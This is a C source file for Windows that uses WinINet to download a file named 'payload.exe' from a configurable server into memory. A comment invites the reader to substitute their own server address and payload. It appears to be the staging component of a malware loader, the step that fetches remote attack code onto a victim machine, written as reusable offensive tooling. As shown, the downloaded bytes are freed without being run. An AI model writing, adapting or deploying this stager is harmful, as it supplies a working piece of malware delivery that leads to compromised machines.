#include <stdio.h>
#include <windows.h>
#include <wininet.h>

BOOL GetPayloadFromUrl() {

	HINTERNET	hInternet              = NULL,
			    hInternetFile          = NULL;
	
	DWORD		dwBytesRead            = NULL;
  
	SIZE_T		sSize                   = NULL;
	
	PBYTE		pBytes                  = NULL; 
	PBYTE		pTmpBytes               = NULL; 

	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	hInternetFile = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/payload.exe", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL); // write your own server's ip and payload name
	if (hInternetFile == NULL) {
		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		return FALSE;
	}

	while (TRUE) {
		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			printf("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			return FALSE;
		}
		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else{
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }
		if (pBytes == NULL) {
			return FALSE;
		}

		memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

		memset(pTmpBytes, '\0', dwBytesRead);
		if (dwBytesRead < 1024) {
			break;
		}

	}

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hInternetFile);
	InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	LocalFree(pTmpBytes);
	LocalFree(pBytes);

	return TRUE;
}

int main(int argc, char *argv[]) {
    if (GetPayloadFromUrl()) {
        printf("[+] Payload downloaded successfully.\n");
    } else {
        printf("[!] Failed to download payload.\n");
    }
    return 0;
}
